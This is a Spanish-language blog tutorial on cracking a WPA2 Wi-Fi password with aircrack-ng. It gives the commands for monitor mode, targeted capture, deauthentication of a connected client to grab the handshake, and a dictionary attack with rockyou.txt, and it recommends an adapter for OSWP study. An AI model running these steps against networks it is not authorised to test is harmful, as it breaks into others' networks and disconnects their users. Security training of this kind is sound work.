---
layout: post
title:  "Hacking Wifi (cracking Handshake)"
author: erik
categories: [ Wifi ]
image: https://user-images.githubusercontent.com/47476901/132572928-786e2463-ba7a-460d-8195-6fab060b7f78.png
beforetoc: ""
toc: false
tags: [ Wifi ]
---
Crackeando el Handshake 

# Table of Contents
1. [Interface Configuration](#interfaces)
2. [Detener los procesos](#detenerprocesos)
3. [Modo monitor](#monitormode)
4. [Redes Wifi cercanas](#wificonnections)
5. [Ver los clientes conectados a la red](#clients)
6. [Deautenticacion Dirigido](#deautenticacion)
7. [Descifrar la contraseña](#descifrarpassword)
8. [Adaptadores para auditoria wifi](#adaptadores)

---

### 1- Ifconfig (Interface Configuration) <a name="interfaces"></a>
![ifconfig](https://user-images.githubusercontent.com/47476901/132572799-6168d979-07c5-4dee-a167-24d62fc5abe2.png)
- **eth0**: Ethernet Interface
- **l0**: Loopback Interface
- **wlan0**: Wireless network interface.

### 2- Detener los procesos activos que se están usando: <a name="detenerprocesos"></a>

```md
airmon-ng check kill
```
![airmonkill](https://user-images.githubusercontent.com/47476901/132572813-42ed54c0-cbe9-44b8-b2f4-194dcc86afbe.png)

### 3- Iniciar el modo monitor en wlan0. <a name="monitormode"></a>

```md
airmon-ng start wlan0
```
![startwlan0](https://user-images.githubusercontent.com/47476901/132572832-a7c85f74-df34-4842-b17e-44f802ba4acd.png)

### 4- Ver todas las redes wifi cerca de ti. <a name="wificonnections"></a>

```md
airodump-ng wlan0
```
Con el comando airodump-ng wlan0 podemos hacer una visual de todos los paquetes que estan viajando en tiempo real

![airodump](https://user-images.githubusercontent.com/47476901/132572839-f43de30b-ddd4-4aca-a65d-280ce3b9bac6.png)

Identificar al objetivo:

![objetive](https://user-images.githubusercontent.com/47476901/132572844-402edfa2-89d2-425d-9f13-045547856723.png)

### 5- Ver los clientes conectados a la red de destino. <a name="clients"></a>

Empezariamos usando airodump-ng y vamos filtrando a nuestro gusto.
Podemos observar que hay un cliente conectado.

![clients](https://user-images.githubusercontent.com/47476901/132572850-0a106579-fc25-4e5d-90af-4845caa6a5ea.png)

```md
airodump-ng --bssid 66:FB:F4:F6:38:9A wlan0 -w captura -c 1
```
- **-- bssid**: Es "66:FB:F4:F6:38:9A" 
- **wlan0**: Mi tarjeta de red monitorizada es wlan0
- **-w captura**: Será el archivo en el que se escribirán los datos
-  **-c 1**: Está en el canal 1 de esta forma lo indicamos "-c 1"  





### 6- Deautenticacion Dirigido. <a name="deautenticacion"></a>
Desconectar a los clientes conectados a la red.
Cuando el cliente intente volver a conectarse a la red podremos empezar a crackear la contraseña ya que tendremos el paquete necesario.

![disconnect_clients](https://user-images.githubusercontent.com/47476901/132572858-40057c38-7ab7-4e77-b3b9-d1a51c369871.png)

```md
aireplay-ng -0 10 -a 66:FB:F4:F6:38:9A wlan0
```

- **-0**: Para la desautenticacion
- **10**: Número de paquetes de desautenticacion que se enviarán
- **-a**: El BSSID de la red de destino.
- **wlan0**: Nombre de la interfaz



### 7-  Descifrar la contraseña <a name="descifrarpassword"></a>

![decrypt](https://user-images.githubusercontent.com/47476901/132572876-088d3181-09dc-447b-8213-749d148ad800.gif)

```md
aircrack-ng -a2 -b  66:FB:F4:F6:38:9A -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

- **-a**: -a2 para WPA2 y -a para WPA.
- **-b**: el BSSID de la red de destino.
- **-w /usr/share/wordlists/rockyou.txt**: es el diccionario de las contraseñas que usaremos.
- **captura-01.cap**: es el archivo que necesitamos ya que es donde están todos los paquetes que hemos interceptado

Finalmente obtenemos la contraseña:

![password](https://user-images.githubusercontent.com/47476901/132588909-138e4344-51cc-4172-827f-98a569313782.png)

## Adaptadores para auditoria wifi <a name="adaptadores"></a>
Recomiendo los adaptores de Alpha Network, son de muy buena calidad y estan enfocados para este tipo de uso.
He usado el AWUS036ACH funciona a la perfeccion y tiene bastante potencia. 100% recomendable para la certificacion <a href="https://www.offensive-security.com/wifu-oswp/" target="_blank">OSWP</a>

![adaptador](https://user-images.githubusercontent.com/47476901/150223892-27e6ec82-079c-4dfc-b0dc-ee534b67ee37.png)


Link de la pagina oficial donde se pueden adquirir estos adaptadores.
- <a href="https://alfa-network.eu/wi-fi/wi-fi-adapters?product_list_order=price&product_list_dir=desc" target="_blank">Alpha Network</a>

Si tiene algun problema al instalar los drivers puede ver el siguiente post donde explica como solucionar los problemas mas comunes al realizar dicha instalacion.
- <a href="https://b3nj1-1.github.io/blog/wifi/2022/01/17/WIFI/" target="_blank">Install Drivers Solution</a>
